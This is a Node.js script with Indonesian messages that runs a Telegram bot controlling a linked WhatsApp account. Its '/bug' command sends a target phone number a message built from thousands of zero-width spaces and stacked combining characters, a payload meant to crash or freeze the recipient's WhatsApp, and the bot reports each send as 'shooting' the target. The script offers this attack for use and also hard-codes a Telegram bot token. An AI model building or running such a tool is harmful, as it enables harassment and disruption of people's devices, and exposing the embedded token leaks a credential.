const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys')
const P = require('pino')
const TelegramBot = require('node-telegram-bot-api')
const QRCode = require('qrcode')

const TELEGRAM_TOKEN = '9095531664:AAGxlOBp9ZR7RC5NPlVUcPn-SiTNmKTcxP4'
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true })

let waSock = null;
let adminChatId = null;

async function startWA(chatId) {
    const { state, saveCreds } = await useMultiFileAuthState('session')
    
    waSock = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        logger: P({ level: 'silent' })
    })

    waSock.ev.on('creds.update', saveCreds)

    waSock.ev.on('connection.update', async (update) => {
        const { connection, qr } = update
        
        if (qr) {
            // Ubah QR jadi Gambar lalu kirim ke Telegram
            const qrImage = await QRCode.toBuffer(qr);
            bot.sendPhoto(chatId, qrImage, { caption: '📲 Scan QR ini pakai WhatsApp (Linked Devices)' })
        }

        if (connection === 'open') {
            bot.sendMessage(chatId, '✅ Bot WA Berhasil Tersambung! Siap menembak.')
        }
    })
}

bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '🤖 BOT BUG READY\n\n/start - Menu\n/qr - Scan WA\n/bug 62xxx - Tembak Target')
})

bot.onText(/\/qr/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '⏳ Menyiapkan QR Code...')
    startWA(adminChatId)
})

bot.onText(/\/bug (.+)/, async (msg, match) => {
    const target = match[1]
    if (!waSock) return bot.sendMessage(adminChatId, '❌ WA belum login. Ketik /qr dulu.')
    
    try {
        let jid = target.replace(/\D/g, '') + '@s.whatsapp.net'
        bot.sendMessage(adminChatId, `⏳ Menembak target ${target}...`)

        let payload = "\u200b".repeat(5000) + "\u0300\u0301\u0302\u0303".repeat(100)
        await waSock.sendMessage(jid, { text: payload })
        
        bot.sendMessage(adminChatId, `✅ BUG BERHASIL DIKIRIM KE ${target}`)
    } catch (err) {
        bot.sendMessage(adminChatId, `❌ Gagal: ${err.message}`)
    }
})

console.log('Bot Telegram berjalan...')
